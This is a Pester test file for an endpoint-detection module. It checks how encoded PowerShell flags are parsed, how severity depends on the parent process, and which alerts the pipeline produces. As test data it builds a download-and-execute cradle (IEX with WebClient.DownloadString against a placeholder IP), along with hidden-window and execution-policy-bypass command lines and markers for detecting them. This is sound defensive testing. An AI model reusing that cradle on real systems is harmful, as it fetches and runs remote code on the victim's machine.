BeforeDiscovery { Import-Module (Join-Path (Split-Path -Parent $PSScriptRoot) 'src/EdrCanary/EdrCanary.psd1') -Force }
BeforeAll { . (Join-Path $PSScriptRoot 'TestHelpers.ps1') }

# Detection content for EDR-PT-005 and the encoded-command marker used by EDR-PT-001 to 004.
# The cases mirror tests/fixtures/encoded_powershell_cases.ndjson and docs/case-studies/02.
Describe 'Encoded PowerShell parsing' {
    InModuleScope EdrCanary {
        BeforeAll { $script:settings = Get-EdrSettings -Override @{ OutputDir = $TestDrive } }
        It 'recognises the abbreviation <flag>' -ForEach @(
            @{ flag = '-e' }, @{ flag = '-ec' }, @{ flag = '-en' }, @{ flag = '-enc' }, @{ flag = '/enc' }
            @{ flag = '-EncodedCommand' }, @{ flag = '-ENCODEDCOMMAND' }, @{ flag = '/e' }
        ) {
            $r = Get-EdrEncodedCommand -CommandLine "powershell.exe -NoProfile $flag RwBlAHQALQBEAGEAdABlAA=="
            $r.Payload | Should -Be 'RwBlAHQALQBEAGEAdABlAA=='
            $r.Decoded | Should -Be 'Get-Date'
        }

        It 'ignores <cmd>' -ForEach @(
            @{ cmd = 'powershell -Command Get-Content a.txt -Encoding UTF8' }
            @{ cmd = 'powershell -ExecutionPolicy RemoteSigned -File C:\Scripts\backup.ps1' }
            @{ cmd = 'powershell -ep bypass -File C:\Scripts\enc.ps1' }
            @{ cmd = 'pwsh -EncodedArguments PAA=' }
            @{ cmd = 'powershell -e' }
        ) {
            Get-EdrEncodedCommand -CommandLine $cmd | Should -BeNullOrEmpty
        }

        It 'still reports the flag when the payload is not valid Base64 text' {
            $r = Get-EdrEncodedCommand -CommandLine 'powershell -enc AAAAAAAAA'
            $r.Payload | Should -Be 'AAAAAAAAA'
        }

        It 'checks the decoded payload for download-cradle markers' {
            $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a')"))
            $m = (Get-EdrCommandLineMarker -CommandLine "powershell -e $b64" -Settings $settings).Markers
            $m | Should -Contain 'encodedcommand'
            $m | Should -Contain 'decoded:downloadstring'
            $m | Should -Contain 'decoded:http://'
        }

        It 'no longer treats -Encoding as an obfuscation marker' {
            (Get-EdrCommandLineMarker -CommandLine 'powershell -Command Import-Csv a.csv -Encoding UTF8' -Settings $settings).Markers |
                Should -BeNullOrEmpty
        }
    }
}

Describe 'EDR-PT-005 severity from parent context' {
    InModuleScope EdrCanary {
        BeforeAll { $script:settings = Get-EdrSettings -Override @{ OutputDir = $TestDrive } }
        BeforeEach {
            $script:t = New-EdrProcessTable
            $script:cradle = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a')"))
            $script:benign = 'RwBlAHQALQBEAGEAdABlAA=='   # Get-Date
            $start = [datetime]'2026-10-27T10:00:00Z'
            Add-EdrProcess -Table $t -ProcessId 1200 -ImageName 'explorer.exe' -StartTime $start
            Add-EdrProcess -Table $t -ProcessId 5000 -ImageName 'wmiprvse.exe' -StartTime $start
            Add-EdrProcess -Table $t -ProcessId 5500 -ImageName 'ccmexec.exe' -StartTime $start
            Add-EdrProcess -Table $t -ProcessId 5200 -ParentProcessId 1200 -ImageName 'winword.exe' -StartTime $start
        }

        It '<name>' -ForEach @(
            @{ name = 'user shell parent: medium';                       parent = 1200; cmd = 'powershell -ec {B}';                     rule = 'EDR-PT-005'; sev = 'medium' }
            @{ name = 'WMI parent with hidden window and cradle: high';  parent = 5000; cmd = 'powershell -NoP -W Hidden -e {C}';       rule = 'EDR-PT-005'; sev = 'high' }
            @{ name = 'WMI parent, benign payload: high';                parent = 5000; cmd = 'powershell -e {B}';                      rule = 'EDR-PT-005'; sev = 'high' }
            @{ name = 'SCCM parent with Bypass: low';                    parent = 5500; cmd = 'powershell -ExecutionPolicy Bypass -EncodedCommand {B}'; rule = 'EDR-PT-005'; sev = 'low' }
            @{ name = 'SCCM parent with a download cradle: medium';      parent = 5500; cmd = 'powershell -EncodedCommand {C}';         rule = 'EDR-PT-005'; sev = 'medium' }
            @{ name = 'Office parent: PT-001 escalated, no PT-005 duplicate'; parent = 5200; cmd = 'powershell -e {C}';                rule = 'EDR-PT-001'; sev = 'critical' }
        ) {
            $line = $cmd.Replace('{B}', $benign).Replace('{C}', $cradle)
            Add-EdrProcess -Table $t -ProcessId 7000 -ParentProcessId $parent -ImageName 'powershell.exe' -CommandLine $line -StartTime ([datetime]'2026-10-27T10:00:05Z')
            $hits = @(Test-EdrProcessTreeAnomaly -Table $t -ProcessId 7000 -Settings $settings)
            $hits.Count | Should -Be 1
            $hits[0].RuleId | Should -Be $rule
            $hits[0].Severity | Should -Be $sev
        }

        It 'raises nothing for PowerShell without an encoded command' {
            Add-EdrProcess -Table $t -ProcessId 7001 -ParentProcessId 1200 -ImageName 'powershell.exe' -CommandLine 'powershell -NoProfile -Command Get-Content a.txt -Encoding UTF8' -StartTime ([datetime]'2026-10-27T10:00:05Z')
            @(Test-EdrProcessTreeAnomaly -Table $t -ProcessId 7001 -Settings $settings).Count | Should -Be 0
        }

        It 'fires when the parent is unknown to the process table' {
            Add-EdrProcess -Table $t -ProcessId 7002 -ParentProcessId 999 -ImageName 'pwsh.exe' -CommandLine "pwsh /enc $benign" -StartTime ([datetime]'2026-10-27T10:00:05Z')
            $hit = @(Test-EdrProcessTreeAnomaly -Table $t -ProcessId 7002 -Settings $settings)[0]
            $hit.RuleId | Should -Be 'EDR-PT-005'
            $hit.Severity | Should -Be 'medium'
        }
    }
}

Describe 'Encoded PowerShell through the pipeline' {
    BeforeEach { $script:settings = New-TestSettings -OutputDir (Join-Path $TestDrive "out-$([guid]::NewGuid())") }

    It 'puts the decoded command in the alert' {
        $ctx = New-EdrContext -Settings $settings
        Invoke-EdrEvent -Context $ctx -EdrEvent (New-TestEvent -Type ProcessStart -ProcessId 1 -ImageName 'explorer.exe') | Out-Null
        $a = Invoke-EdrEvent -Context $ctx -EdrEvent (New-TestEvent -Type ProcessStart -ProcessId 2 -ParentProcessId 1 -ImageName 'powershell.exe' -CommandLine 'powershell -ec RwBlAHQALQBEAGEAdABlAA==' -Offset 1)
        $a.rule.id | Should -Be 'EDR-PT-005'
        $a.edr.decoded_command | Should -Be 'Get-Date'
        $a.event.severity | Should -Be 47
    }

    It 'does not auto-contain alerts below Containment.MinSeverity' {
        $settings.AutoContain = $true
        $calls = [System.Collections.Generic.List[int]]::new()
        $ctx = New-EdrContext -Settings $settings -Contain {
            param($ProcessId, $ImageName, $Settings)
            $calls.Add($ProcessId)
            [pscustomobject]@{ Snapshot = 'snap.json' }
        }.GetNewClosure()
        Invoke-EdrEvent -Context $ctx -EdrEvent (New-TestEvent -Type ProcessStart -ProcessId 1 -ImageName 'ccmexec.exe') | Out-Null
        $low = Invoke-EdrEvent -Context $ctx -EdrEvent (New-TestEvent -Type ProcessStart -ProcessId 2 -ParentProcessId 1 -ImageName 'powershell.exe' -CommandLine 'powershell -EncodedCommand RwBlAHQALQBEAGEAdABlAA==' -Offset 1)
        $low.event.severity | Should -Be 21
        $low.Contains('edr_response') | Should -BeFalse
        $calls.Count | Should -Be 0
    }

    It 'produces the expected verdict for every labelled case in the regression fixture' {
        $rows = @(& (Join-Path $ProjectRoot 'scripts/Invoke-RuleRegression.ps1'))
        $verdict = @{}
        foreach ($r in $rows) { $verdict[$r.Case.Split(' ')[0]] = "$($r.Rule) $($r.Severity)" }
        $verdict['M1'] | Should -Be 'EDR-PT-005 high'
        $verdict['M2'] | Should -Be 'EDR-PT-005 medium'
        $verdict['M3'] | Should -Be 'EDR-PT-005 medium'
        $verdict['M4'] | Should -Be 'EDR-PT-001 critical'
        $verdict['B1'] | Should -Be '- no alert'
        $verdict['B2'] | Should -Be 'EDR-PT-001 high'
        $verdict['B3'] | Should -Be 'EDR-PT-005 low'
        $verdict['B4'] | Should -Be '- no alert'
        $verdict['B5'] | Should -Be '- no alert'
    }
}
